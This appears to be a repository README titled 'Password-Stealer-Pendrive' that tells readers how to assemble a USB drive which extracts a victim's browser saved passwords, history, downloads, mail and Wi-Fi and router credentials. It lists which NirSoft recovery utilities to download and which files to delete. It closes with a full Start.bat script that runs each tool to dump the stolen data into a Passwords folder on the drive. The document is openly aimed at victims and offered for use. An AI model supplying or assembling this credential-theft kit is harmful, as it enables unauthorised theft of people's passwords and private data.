# Password-Stealer-Pendrive


By using this process you can get the victims
      Browser Downloads
      Browser History
      Browser Saved Passwords


First of all go to this link https://www.nirsoft.net/password_recovery_tools.html


Then read the instructions and download those softwares
Then extract the .zip file and only save the extraxted files in your pendrive


Then delete:

      Dailupass.exe
      netpass.exe
      x64 (folder)
      
      
      
Then download:

      https://www.nirsoft.net/utils/browsing_history_view.html
      https://www.nirsoft.net/utils/web_browser_downloads_view.html
      https://www.nirsoft.net/utils/process_tcp_summary.html
      https://www.nirsoft.net/utils/router_password_recovery.html
    
Your pendrive will look like this after downloading all the above files:

https://i.imgur.com/sbzTDM1.png



Finally, Create a folder named  Passwords

then create a file named  Start.bat 

Open Start.bat with notepad

Finally paste the code below:
      start BrowserDownloadsView.exe /stext Passwords\BrowserDownloads.txt
      start BrowsingHistoryView.exe /stext Passwords\BrowsingHistory.txt
      start ChromePass.exe /stext Passwords\ChromePass.txt
      start iepv.exe /stext Passwords\iepv.txt
      start mailpv.exe /stext Passwords\mailpv.txt
      start mspass.exe /stext Passwords\mspass.txt
      start PasswordFox.exe /stext Passwords\PasswordFox.txt
      start ProcessTCPSummary.exe /stext Passwords\ProcessTCPSummary.txt
      start PstPassword.exe /stext Passwords\PstPassword.txt
      start RouterPassView.exe /stext Passwords\RouterPassView.txt
      start WebBrowserPassView.exe /stext Passwords\WebBrowserPass.txt
      start WifiHistoryView.exe /stext Passwords\WifiHistoryView.txt
